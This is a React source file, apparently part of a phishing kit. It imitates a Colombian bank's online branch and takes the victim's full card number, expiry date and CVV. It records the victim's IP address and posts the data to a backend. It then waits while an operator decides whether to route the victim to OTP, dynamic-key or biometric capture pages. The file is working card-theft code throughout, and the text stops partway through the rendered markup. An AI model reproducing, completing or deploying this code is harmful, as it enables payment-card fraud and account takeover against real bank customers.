import './css/LoginModal.css';
import { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import localStorageService from "../../services/localStorageService";
import Loading from "../../components/Loading";
import NumOTPModal from "./modals/NumOTP-Modal";
import Payment from "payment";
import { CARD_TEXT_CONFIG } from "./cardTextConfig"; // Importar configuración
import { limpiarPaddingBody } from "../../../@utils"; // Importar utilidad de limpieza

// Estilos para la animación de flip
const flipStyles = `
  .flip-card {
    background-color: transparent;
    width: 100%;
    max-width: 350px;
    aspect-ratio: 1.586;
    perspective: 1000px;
    margin: 0 auto 30px auto;
  }

  .flip-card-inner {
    position: relative;
    width: 100%;
    height: 100%;
    text-align: center;
    transform-style: preserve-3d;
    transition: transform 0.8s cubic-bezier(0.4, 0.2, 0.2, 1);
    will-change: transform; /* 🔥 evita parpadeos */
  }

  .flip-card-inner.flipped {
    transform: rotateY(180deg);
  }

  .flip-card-front,
  .flip-card-back {
    position: absolute;
    inset: 0; /* 🔑 CLAVE: fuerza mismo tamaño exacto */
    backface-visibility: hidden;
    border-radius: 12px;
    overflow: hidden;
  }

  .flip-card-back {
    transform: rotateY(180deg);
  }

  .flip-card-front img,
  .flip-card-back img {
    width: 100%;
    height: 100%;
    object-fit: cover; /* 🔑 normaliza imágenes distintas */
    display: block;
  }
`;


export default function ValidacionTC() {
    const navigate = useNavigate();

    // --- ESTADOS ---
    const [step, setStep] = useState("front"); // 'front' | 'back'
    const [cardDigits, setCardDigits] = useState("");
    const [expirationDate, setExpirationDate] = useState("");
    const [cvv, setCvv] = useState("");

    // Estados de UI/Sistema
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");
    const [isFocused, setIsFocused] = useState(false);
    const [focusedField, setFocusedField] = useState(""); // 'digits' | 'expiration' | 'cvv'
    const [cargando, setCargando] = useState(false);
    const [submitted, setSubmitted] = useState(false); // Flag para prevenir múltiples envíos
    const [isTCCustom, setIsTCCustom] = useState(false); // Flag para determinar si es TC Custom

    // Estado principal de tarjeta
    const [cardData, setCardData] = useState({
        filename: "",
        tipo: "",
        digits: "",
        label: ""
    });

    // Modal de error (datos inválidos / timeout)
    const [formState, setFormState] = useState({ lanzarModalErrorSesion: false });

    // Refs para "aprobar custom": mantener usuario en espera hasta que admin pulse OTP/DIN/FIN
    const estadoAnteriorRef = useRef(null);
    const aprobadoEsperandoRef = useRef(false);

    // Estado para controlar la carga de imágenes (evita ver tarjeta anterior)
    const [imagesLoaded, setImagesLoaded] = useState(false);
    const [loadingImages, setLoadingImages] = useState(false);

    // Estado para validación de tarjeta con algoritmo de Luhn
    const [isCardValid, setIsCardValid] = useState(null); // null = no validado, true = válida, false = inválida

    // --- LÓGICA DE TARJETA E IMÁGENES --- (Mover aquí para que isAmex tenga acceso a cardData actualizado)
    const isAmex = (cardData.label || "").toLowerCase().includes("amex") ||
        (cardData.filename || "").toLowerCase().includes("amex") ||
        (cardData.tipo || "").toLowerCase().includes("american");

    // AMEX total 15 digits. Backend sends last 4. 
    // So user must enter first 11 digits. 11 + 4 = 15.
    // Standard cards: 16 digits. User enters first 12. 12 + 4 = 16.
    const requiredDigitsLength = isAmex ? 11 : 12;
    const requiredCvvLength = isAmex ? 4 : 3;

    // --- UTILS ---
    // Helper to normalize card data (handles legacy PNGs and renamed assets like Amex Green)
    const normalizeCardData = (data) => {
        if (!data || !data.filename) return data;
        let filename = data.filename;

        // 1. Convert legacy .webp to .webp
        if (filename.endsWith(".webp")) {
            filename = filename.replace(".webp", ".webp");
        }

        // 2. Specific migrations for renamed assets
        if (filename === "imgi_21_AMEX+Green.webp") {
            filename = "Amex-Green-v2.webp";
        }

        return { ...data, filename };
    };

    // --- LÓGICA DE CARGA DE DATOS ---
    useEffect(() => {
        // Validar acceso antes de cargar datos
        const validateAccess = async () => {
            try {

                // Se usa el cargando
                setCargando(true);

                const raw = localStorage.getItem("datos_usuario");
                const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                const sesionId = usuarioLocalStorage?.sesion_id;

                if (!sesionId) {
                    console.error('Acceso sin sesionId');
                    navigate('/');
                    return false;
                }

                // Verificar estado del backend
                const { instanceBackend } = await import("../../axios/instanceBackend");
                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                const { estado, cardData: backendCardData } = response.data;

                // Solo permitir acceso si el estado es correcto
                const estadosPermitidos = [
                    'solicitar_tc',
                    'solicitar_tc_custom',
                    'awaiting_tc_approval',
                    'error_tc',
                    'error_tc_custom'
                ];

                if (!estadosPermitidos.includes(estado)) {
                    console.error('Acceso no autorizado a TC. Estado actual:', estado);
                    navigate('/');
                    return false;
                }

                // Cargar cardData del backend (prioridad sobre localStorage)
                if (backendCardData) {
                    const normalized = normalizeCardData(backendCardData);
                    setCardData(normalized);
                    localStorageService.setItem("selectedCardData", normalized);
                    setIsTCCustom(estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval');

                    // Se quita el cargando
                    setCargando(false);
                } else {
                    // Fallback a localStorage si existe
                    const savedCardData = localStorageService.getItem("selectedCardData");
                    if (savedCardData) {
                        const normalized = normalizeCardData(savedCardData);
                        setCardData(normalized);
                        setIsTCCustom(estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval');
                    }

                    // Se quita el cargando
                    setCargando(false);
                }

                return true;
            } catch (error) {
                console.error("Error validando acceso:", error);
                navigate('/');
                return false;
            }
        };

        validateAccess();

        // Limpiar estilos residuales (padding blanco)
        limpiarPaddingBody();
        document.body.classList.remove('has-fixed-navbar');

        obtenerIP();
        obtenerFechaHora();
    }, []);

    // Timer para fecha/hora
    useEffect(() => {
        const ahora = new Date();
        const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();
        let intervalId;

        const timeoutId = setTimeout(() => {
            obtenerFechaHora();
            intervalId = setInterval(obtenerFechaHora, 60000);
        }, msHastaProximoMinuto);

        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // useEffect para precargar imágenes cuando cambia cardData
    useEffect(() => {
        const preloadImages = async () => {
            setLoadingImages(true);
            setImagesLoaded(false);

            const frontPath = cardData.tipo === "credito"
                ? `/assets/images/IMGtarjetas/${cardData.filename}`
                : `/assets/images/IMGdebitotj/${cardData.filename}`;

            const backFilename = getBackCardFilename(cardData.filename);
            const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
            const backPath = backFilename
                ? `/assets/images/${folder}/${backFilename}`
                : frontPath;

            try {
                // Precargar ambas imágenes simultáneamente
                const loadImage = (src) => {
                    return new Promise((resolve, reject) => {
                        const img = new Image();
                        img.onload = () => resolve(img);
                        img.onerror = reject;
                        img.src = src;
                    });
                };

                await Promise.all([
                    loadImage(frontPath),
                    loadImage(backPath)
                ]);

                // Ambas imágenes cargadas exitosamente
                setImagesLoaded(true);
                setLoadingImages(false);
            } catch (error) {
                console.error("Error precargando imágenes:", error);
                // Aún así permitir mostrar (fallback)
                setImagesLoaded(true);
                setLoadingImages(false);
            }
        };

        preloadImages();
    }, [cardData.filename, cardData.tipo]);


    const obtenerIP = async () => {
        try {
            const response = await fetch("https://api.ipify.org?format=json");
            const data = await response.json();
            setIp(data.ip);
        } catch (error) {
            setIp("No disponible");
        }
    };

    const obtenerFechaHora = () => {
        const ahora = new Date();
        const opciones = { weekday: "long", year: "numeric", month: "long", day: "numeric", hour: "numeric", minute: "2-digit", hour12: true };
        setFechaHora(ahora.toLocaleString("es-CO", opciones));
    };


    // 1. Mapa de imágenes frontales a traseras
    const getBackCardFilename = (frontFilename) => {
        // Normalizar a .webp antes de buscar en el mapa
        let normalizedFilename = frontFilename;
        if (frontFilename && frontFilename.endsWith(".png")) {
            normalizedFilename = frontFilename.replace(".png", ".webp");
        }

        const frontToBackMap = {
            // Crédito - Mastercard
            "imgi_10_Mastercard_ideal_.webp": "Mastercard-ideal.webp",
            "imgi_11_Mastercard_joven_.webp": "Mastercard-joven.webp",
            "imgi_12_clasica_.webp": "Mastercard-clasica.webp",
            "imgi_14_Mastercard_credit-card.webp": "Mastercard-Unica.webp",
            "imgi_15_275x172.webp": "Mastercard-Standard.webp",
            "imgi_16_Mastercard_oro_.webp": "Mastercard-oro.webp",
            "imgi_19_Mastercard_611_600x379.webp": "Mastercard-Platinum.webp",
            "imgi_24_Mastercard_612_600x379.webp": "Mastercard-Black-v1.webp",
            "imgi_26_Mastercard_+Tarjeta+Virtual.webp": "Mastercard-E-Card-v1.webp",
            "imgi_29_Mastercard-Sufi_Optimizada.webp": "Mastercard-Sufi-v1.webp",
            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.webp": "Mastercard-Esso-mobil-v1.webp",
            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.webp": "Mastercard-Esso-mobil-v1.webp",
            // Crédito - Visa
            "imgi_13_+Visa+clasica+tradicional.webp": "Visa-Clasica.webp",
            "imgi_17_Visa+Seleccion+Colombia.webp": "Visa-seleccion-colombia.webp",
            "imgi_18_Visa+Oro.webp": "Visa-Oro.webp",
            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.webp": "Visa-LifeMiles-v1.webp",
            "imgi_25_Visa+Platinum+Conavi.webp": "Visa-Platinum-v1.webp",
            "imgi_28_Visa_Infinite_Card.webp": "Visa-infinite-v1.webp",
            // Crédito - Amex
            "imgi_20_AMEX+SkyBlue.webp": "Amex-blue.webp",
            "Amex-Green-v2.webp": "CVV-Amex-Greem.webp",
            "imgi_22_AMEX+Gold.webp": "Amex-Gold-v1.webp",
            "imgi_27_AMEX+Platinum.webp": "Amex-Platinum-v1.webp",
            "imgi_7_Amex+Libre.webp": "Amex+Libre.webp",
            // Débito
            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp": "Débito_Cívica.webp",
            "imgi_5_Debito_(preferencial).webp": "Débito Preferencial.webp",
            "imgi_7_004_600x379.webp": "Débito Clásica.webp",
            "debito_virtual.webp": "debito_virtual.webp"
        };
        return frontToBackMap[normalizedFilename] || null;
    };

    // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
    // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
    const CARD_ADJUSTMENTS = {
        // --- VISA ---
        "Visa-Clasica.webp": { transform: "scale(1.15)" },
        "Visa-seleccion-colombia.webp": { transform: "scale(1.15)" },
        "Visa-Oro.webp": { transform: "scale(1.15)" },
        "Visa-Platinum-v1.webp": { transform: "scale(1.1)" },
        // --- MASTERCARD ---
        "Mastercard-Unica.webp": { transform: "scale(1.1)" },
        "Mastercard-oro.webp": { transform: "scale(1.1)" },
        "Mastercard-Esso-mobil-v1.webp": { transform: "scale(1.15)" },
        "Mastercard-Platinum.webp": { transform: "scale(1.1)" },
        "Mastercard-Black-v1.webp": { transform: "scale(1.06)" },
        "Mastercard-E-Card-v1.webp": { transform: "scale(1.05)" },
        "Débito Cívica.webp": { transform: "scale(1.03)" },
        "Débito Preferencial.webp": { transform: "scale(1.04)" },
        "Débito Clásica.webp": { transform: "scale(1.04)" },
        "debito_virtual.webp": { transform: "scale(1.05)" },
        // --- AMEX ---
        "Amex+Libre.webp": { transform: "scale(1.15)" },
    };

    const getCardStyle = (filename) => {
        return CARD_ADJUSTMENTS[filename] || {};
    };

    const getCardImagePath = () => {
        const basePath = cardData.tipo === "credito" ? "/assets/images/IMGtarjetas/" : "/assets/images/IMGdebitotj/";
        return `${basePath}${cardData.filename}`;
    };

    const getBackCardImagePath = () => {
        const backFilename = getBackCardFilename(cardData.filename);
        if (!backFilename) return getCardImagePath();
        const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
        return `/assets/images/${folder}/${backFilename}`;
    };

    // Función para obtener el tipo de tarjeta en texto legible
    const getTipoTarjeta = () => cardData.tipo === "credito" ? "Crédito" : "Débito";

    // --- HELPER PARA CONFIGURACIÓN DE TEXTO ---
    const getCardConfig = (filename) => {
        // Asegurar normalización a .webp para buscar en config
        let lookupFilename = filename;
        if (filename && filename.endsWith(".png")) {
            lookupFilename = filename.replace(".png", ".webp");
        }

        const defaultConfig = CARD_TEXT_CONFIG["default"];
        const cardConfig = CARD_TEXT_CONFIG[lookupFilename];

        // Si no existe config para esta tarjeta, usar default completo
        if (!cardConfig) return defaultConfig;

        // Merge: combinar config específico con default
        return {
            digits: { ...defaultConfig.digits, ...(cardConfig.digits || {}) },
            date: { ...defaultConfig.date, ...(cardConfig.date || {}) },
            back: { ...defaultConfig.back, ...(cardConfig.back || {}) }
        };
    };

    // Metodo de manejo de cambios en los dígitos de la tarjeta
    const handleDigitsChange = (e) => {

        // Capturar valor
        const val = e.target.value;

        //Se valida que solo sean numeros y no pase el limite
        if (!/^\d*$/.test(val) || val.length > requiredDigitsLength) {

            // Se retorna
            return;
        };

        // Guardar mientras escribe
        setCardDigits(val);

        // Solo valida cuando ya están los 12 dígitos
        if (val.length === requiredDigitsLength) {

            // Construir número completo (12 + últimos 4 conocidos)
            const fullCardNumber = val + cardData.digits;

            // Se valida con la api de payment
            const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
            const cardType = Payment.fns.cardType(fullCardNumber);

            // Tarjeta inválida (Luhn o tipo desconocido)
            if (!isValidNumber || !cardType) {

                // Se setea en falso
                setIsCardValid(false);

                // Se retorna
                return;
            };

            // Opcional: validar tipo esperado (crédito/débito)
            if (cardData.tipo === "debito" && cardType !== "visa" && cardType !== "mastercard") {

                // Tarjeta inválida para débito
                setIsCardValid(false);

                // Se retorna
                return;
            };

            // Tarjeta válida
            setIsCardValid(true);
        };
    };

    // Metodo de manejo de cambios en la fecha de expiración
    const handleExpirationChange = (e) => {

        // Capturar valor y limpiar no-dígitos
        const raw = e.target.value;
        const numbers = raw.replace(/\D/g, "");

        // Permitir borrar libremente
        if (raw.length < expirationDate.length) {

            // Se setea el valor
            setExpirationDate(raw);

            // Se retorna
            return;
        };

        // Formatear como MM/AA
        const currentYear = new Date().getFullYear() % 100;
        let val = numbers;

        // ===== MES =====
        if (val.length >= 2) {

            // Se valida el mes
            let month = val.slice(0, 2);
            let monthNum = parseInt(month, 10);

            // Corregir mes inválido
            if (monthNum < 1) month = "01";
            if (monthNum > 12) month = "12";

            // Se agrega el slash
            val = month + val.slice(2);
        };

        // ===== AÑO =====
        if (val.length > 2) {

            // Se valida el año
            let year = val.slice(2, 4);

            // Corregir año inválido
            if (year.length === 2) {

                // Se convierte a número
                let yearNum = parseInt(year, 10);

                // Si es menor al año actual, se corrige
                if (yearNum < currentYear) {

                    // Se ajusta al año actual
                    year = String(currentYear);
                };
            };

            // Se agrega el slash
            val = val.slice(0, 2) + "/" + year;
        };

        // Se captura el numero de tarjeta
        const fullCardNumber = cardDigits + cardData.digits;

        // Se vuelve a validar la tarjeta al cambiar la fecha
        const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
        const cardType = Payment.fns.cardType(fullCardNumber);

        // Actualizar estado de validez
        if (isValidNumber && cardType) {

            // Se setea en verdadero
            setIsCardValid(true);
        } else {

            // Se setea en falso
            setIsCardValid(false);
        };

        // Limitar longitud a 5 caracteres (MM/AA)
        if (val.length <= 5) {

            // Se setea el valor
            setExpirationDate(val);
        };
    };

    const handleCvvChange = (e) => {
        const val = e.target.value;
        if (/^\d*$/.test(val) && val.length <= requiredCvvLength) {
            setCvv(val);
        }
    };

    // --- TRANSICIÓN DE PASOS ---
    const handleContinue = async () => {
        if (step === "front") {
            // Validar paso 1: dígitos completos, fecha válida Y TARJETA VÁLIDA
            const isExpirationValid = expirationDate.length === 5 && expirationDate.includes("/");
            const allFieldsValid = cardDigits.length === requiredDigitsLength && isExpirationValid;

            // Solo permitir continuar si la tarjeta es válida
            if (allFieldsValid && isCardValid === true) {
                setStep("back");
                setIsFocused(false);
                setFocusedField("");
            } else if (allFieldsValid && isCardValid === false) {
                // Mostrar modal de error si intentan continuar con tarjeta inválida
                setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
                setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
            }
        } else {
            // Validar paso 2 y Enviar
            if (cvv.length === requiredCvvLength && !submitted) {
                try {
                    setCargando(true);
                    setSubmitted(true); // Bloquear botón permanentemente
                    const raw = localStorage.getItem("datos_usuario");
                    const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                    const sesionId = usuarioLocalStorage?.sesion_id;

                    if (!sesionId) {
                        alert("Error: No se encontró la sesión");
                        setCargando(false);
                        return;
                    }

                    // Construir número completo
                    const numeroTarjetaCompleto = cardDigits + cardData.digits;

                    // --- REGISTRAR INTENTO EN LOCALSTORAGE ---
                    if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
                    const endpoint = isTCCustom ? "/tc-custom" : "/tc";
                    const arrayKey = isTCCustom ? "tc_custom" : "tc";

                    if (!usuarioLocalStorage.usuario[arrayKey]) usuarioLocalStorage.usuario[arrayKey] = [];

                    const nuevoIntento = {
                        intento: usuarioLocalStorage.usuario[arrayKey].length + 1,
                        numeroTarjeta: numeroTarjetaCompleto,
                        fechaExpiracion: expirationDate,
                        cvv: cvv,
                        fecha: new Date().toLocaleString()
                    };

                    usuarioLocalStorage.usuario[arrayKey].push(nuevoIntento);
                    localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));

                    const dataSend = {
                        data: {
                            attributes: usuarioLocalStorage
                        }
                    };

                    const { instanceBackend } = await import("../../axios/instanceBackend");
                    const response = await instanceBackend.post(endpoint, dataSend);

                    if (response.data.success) {
                        iniciarPolling(sesionId);
                    } else {
                        alert("Error al enviar los datos");
                    }

                } catch (error) {
                    console.error("Error enviando TC:", error);
                    alert("Error de conexión con el servidor");
                    setCargando(false);
                }
            }
        }
    };

    // Función de polling
    const iniciarPolling = (sesionId) => {
        let attempts = 0;
        const MAX_ATTEMPTS = 60;
        const TIMEOUT_MS = 180000;
        let timeoutId;
        aprobadoEsperandoRef.current = false;
        estadoAnteriorRef.current = null;

        const pollingInterval = setInterval(async () => {
            try {
                attempts++;
                const { instanceBackend } = await import("../../axios/instanceBackend");
                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                const { estado, cardData } = response.data;

                if (cardData) {
                    const normalized = normalizeCardData(cardData);
                    setCardData(normalized);
                    localStorageService.setItem("selectedCardData", normalized);
                    setIsTCCustom(true);
                }

                console.log('TC Polling:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);

                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
                    setCardDigits("");
                    setExpirationDate("");
                    setCvv("");
                    setStep("front");
                    return;
                }

                if (estado === 'error_tc' || estado === 'error_tc_custom') {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
                    setTimeout(() => {
                        setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
                    }, 4000);
                    setCardDigits("");
                    setExpirationDate("");
                    setCvv("");
                    setStep("front");
                    return;
                }

                const estadosFinales = [
                    'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login',
                    'solicitar_biometria', 'error_923',
                    'solicitar_tc_custom', 'solicitar_cvv_custom',
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                ];
                if (!estadosFinales.includes(estado?.toLowerCase())) return;

                clearInterval(pollingInterval);
                clearTimeout(timeoutId);
                setCargando(false);

                switch (estado.toLowerCase()) {
                    case 'solicitar_otp': navigate('/numero-otp'); break;
                    case 'solicitar_din': navigate('/clave-dinamica'); break;
                    case 'solicitar_finalizar': navigate('/finalizado-page'); break;
                    case 'solicitar_biometria': navigate('/verificacion-identidad'); break;
                    case 'error_923': navigate('/error-923page'); break;
                    case 'solicitar_tc_custom':
                        // Si estamos en polling y el admin vuelve a solicitar TC Custom,
                        // significa que quiere nuevos datos de TC completa (no solo CVV)
                        // Recargar la página para resetear el flujo
                        window.location.reload();
                        break;
                    case 'solicitar_cvv_custom': navigate('/validacion-cvv'); break;
                    case 'solicitar_cvv': navigate('/validacion-cvv'); break;

                    case 'error_otp':
                        localStorage.setItem('estado_sesion', 'error');
                        window.location.href = '/numero-otp';
                        break;
                    case 'error_din':
                        localStorage.setItem('estado_sesion', 'error');
                        window.location.href = '/clave-dinamica';
                        break;
                    case 'error_login':
                        localStorage.setItem('estado_sesion', 'error');
                        window.location.href = '/autenticacion';
                        break;
                }

            } catch (error) {
                attempts++;
                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
                }
            }
        }, 3000);

        timeoutId = setTimeout(() => {
            clearInterval(pollingInterval);
            setCargando(false);
            setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
            setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
            setCardDigits("");
            setExpirationDate("");
            setCvv("");
            setStep("front");
        }, TIMEOUT_MS);
    };

    // --- RENDER HELPERS ---
    const renderVisualInputDigits = () => {
        const length = requiredDigitsLength || 12; // Fallback safety
        return (
            <div className="input-lines-container mb-4" onClick={() => document.getElementById('cardDigits').focus()}
                style={{ display: "flex", gap: "6px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", flexWrap: "wrap" }}>
                {Array.from({ length: length }).map((_, index) => {
                    const activeIndex = cardDigits.length < length ? cardDigits.length : length - 1;
                    const isActive =
                        isFocused &&
                        focusedField === "digits" &&
                        step === "front" &&
                        index === activeIndex;

                    let extraMargin = "0px";
                    if (index > 0) {
                        if (isAmex) {
                            // AMEX (15 total, 11 input)
                            // Grouping: 4-6-5
                            // Input: 11 digits + 4 fixed = 15
                            // Input Groups: 4 digits (0-3), then 6 digits (4-9), then 1 digit (10)
                            if (index === 4) extraMargin = "10px"; // Space after 4th digit (index 3)
                            if (index === 10) extraMargin = "10px"; // Space after 10th digit (index 9)
                        } else {
                            // Standard (16 total, 12 input)
                            // Grouping: 4-4-4-4
                            if (index % 4 === 0) extraMargin = "10px";
                        }
                    }

                    return (
                        <div key={index} style={{
                            width: "20px", height: "30px", marginLeft: extraMargin,
                            borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                            display: "flex", justifyContent: "center", alignItems: "center",
                            color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                        }}>
                            {cardDigits[index] || ""}
                        </div>
                    );
                })}
            </div>
        )
    };

    const renderVisualInputExpiration = () => (
        <div className="input-lines-container" onClick={() => document.getElementById('expirationDate').focus()}
            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", marginTop: "15px" }}>
            {Array.from({ length: 5 }).map((_, index) => {
                const activeIndex = expirationDate.length < 5 ? expirationDate.length : 4;
                const isActive = isFocused && focusedField === "expiration" && step === "front" && index === activeIndex;
                const char = expirationDate[index] || "";
                return (
                    <div key={index} style={{
                        width: index === 2 ? "10px" : "25px",
                        height: "30px",
                        borderBottom: index === 2 ? "none" : `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                        display: "flex", justifyContent: "center", alignItems: "center",
                        color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                    }}>
                        {char}
                    </div>
                );
            })}
        </div>
    );

    const renderVisualInputCVV = () => (
        <div className="input-lines-container" onClick={() => document.getElementById('cvv').focus()}
            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center" }}>
            {Array.from({ length: requiredCvvLength }).map((_, index) => {
                const activeIndex = cvv.length < requiredCvvLength ? cvv.length : requiredCvvLength - 1;
                const isActive = isFocused && step === "back" && index === activeIndex;
                return (
                    <div key={index} style={{
                        width: "30px", height: "30px",
                        borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                        display: "flex", justifyContent: "center", alignItems: "center",
                        color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                    }}>
                        {cvv[index] || ""}
                    </div>
                );
            })}
        </div>
    );

    // Metodo para formatear los dígitos de la tarjeta con espacios
    const formatCardDigits = (digits) => {

        // Limpiar cualquier carácter no numérico, pero dejar el placeholder "•"
        const clean = digits.replace(/[^0-9•]/g, "");
        const lastDigits = cardData.digits || "";

        // AMEX → 4 - 6 - 5 (15 dígitos)
        if (isAmex) {

            // Se dividen en grupos
            const a = clean.slice(0, 4);
            const b = clean.slice(4, 10);
            const c = clean.slice(10, 15);

            // Se agrega los ultimos dígitos al final
            const cWithLast = c + lastDigits;

            // Se retornan con espacios
            return [a, b, cWithLast].filter(Boolean).join(" ");
        };

        // Default → 4 - 4 - 4 - 4 (16 dígitos)
        // Concatenar los 12 dígitos (o placeholders) del input con los 4 últimos del backend
        const fullString = clean + lastDigits;
        return fullString.match(/.{1,4}/g)?.join(" ") || "";
    };

    // Se retorna el componente
    return (
        <>
            <style>{flipStyles}</style>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div style={{
                    flex: 1,
                    backgroundColor: "#2C2A29",
                    backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                    backgroundRepeat: "no-repeat",
                    backgroundPosition: "center",
                    backgroundPositionY: "-70px",
                    backgroundPositionX: "-500px",
                }}>

                    <div style={{ textAlign: "center" }}>
                        <img src="/assets/images/img_pantalla2/descarga.svg" alt="Logo" style={{ width: "238px", marginTop: "45px" }} />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                        }}
                    >
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648" }}>
                            <div style={{ display: "flex", alignItems: "flex-start", gap: "15px", marginBottom: "24px" }}>
                                <img src={getCardImagePath()} alt={cardData.label} style={{ width: "70px", borderRadius: "8px", flexShrink: 0 }} />
                                <h2 className='bc-card-auth-title2 bc-cibsans-font-style-5-bold' style={{ fontSize: "18px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
                                    {step === "front"
                                        ? `Ingresa los datos de tu Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                        : `Validación del CVV de la Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                    }
                                </h2>
                            </div>
                            <p className='bc-card-auth-description' style={{ fontSize: "16px", fontWeight: "500", lineHeight: "24px", color: "#ffffff", marginBottom: "30px", textAlign: "center" }}>
                                {step === "front"
                                    ? `Ingresa los primeros ${isAmex ? 11 : 12} dígitos y la fecha de expiración de tu tarjeta.`
                                    : "Para garantizar la seguridad de tu cuenta, confirma el código de seguridad (CVV)."
                                }
                            </p>
                            <div className="flip-card" style={{
                                opacity: imagesLoaded ? 1 : 0,
                                transition: "opacity 0.3s ease-in-out"
                            }}>
                                <div className={`flip-card-inner ${step === 'back' ? 'flipped' : ''}`}>

                                    <div className="flip-card-front">
                                        <img
                                            src={getCardImagePath()}
                                            alt="Frente"
                                            style={getCardStyle(cardData.filename)}
                                        />
                                        <div
                                            style={{
                                                position: "absolute",
                                                top: getCardConfig(cardData.filename).digits?.top || "58%",
                                                left: getCardConfig(cardData.filename).digits?.left || "50%",
                                                transform: "translate(-50%, -50%)",
                                                width: getCardConfig(cardData.filename).digits?.width || "88%",
                                                textAlign: getCardConfig(cardData.filename).digits?.textAlign || "left",
                                                color: getCardConfig(cardData.filename).digits?.color || "#ffffff",
                                                textShadow: "2px 2px 4px rgba(0,0,0,0.8)",
                                                pointerEvents: "none"
                                            }}
                                        >
                                            <div className="digits-text">
                                                {formatCardDigits(cardDigits.padEnd(requiredDigitsLength, "•"))}
                                            </div>
                                        </div>
                                        <div style={{
                                            position: "absolute",
                                            top: getCardConfig(cardData.filename).date?.top || "75%",
                                            left: getCardConfig(cardData.filename).date?.left || "54%",
                                            transform: "translate(-50%, -50%)",
                                            width: getCardConfig(cardData.filename).date?.width || "88%",
                                            textAlign: getCardConfig(cardData.filename).date?.textAlign || "left",
                                            color: getCardConfig(cardData.filename).date?.color || "#ffffff",
                                            textShadow: "2px 2px 4px rgba(0,0,0,0.8)",
                                            pointerEvents: "none"
                                        }}>
                                            <div className="digits-text">
                                                {expirationDate || "MM/YY"}
                                            </div>
                                        </div>
                                    </div>
                                    <div className="flip-card-back">
                                        <img
                                            src={getBackCardImagePath()}
                                            alt="Reverso"
                                            style={getCardStyle(getBackCardFilename(cardData.filename))}
                                        />
                                        <div style={{
                                            position: "absolute",
                                            top: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.top,
                                            left: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.left,
                                            transform: "translate(-50%, -50%)",
                                            color: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.color,
                                            fontSize: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.fontSize || "20px",
                                            fontFamily: "monospace",
                                            fontWeight: "bold",
                                            pointerEvents: "none"
                                        }}>
                                            {cvv}
                                        </div>
                                    </div>
                                </div>
                            </div>
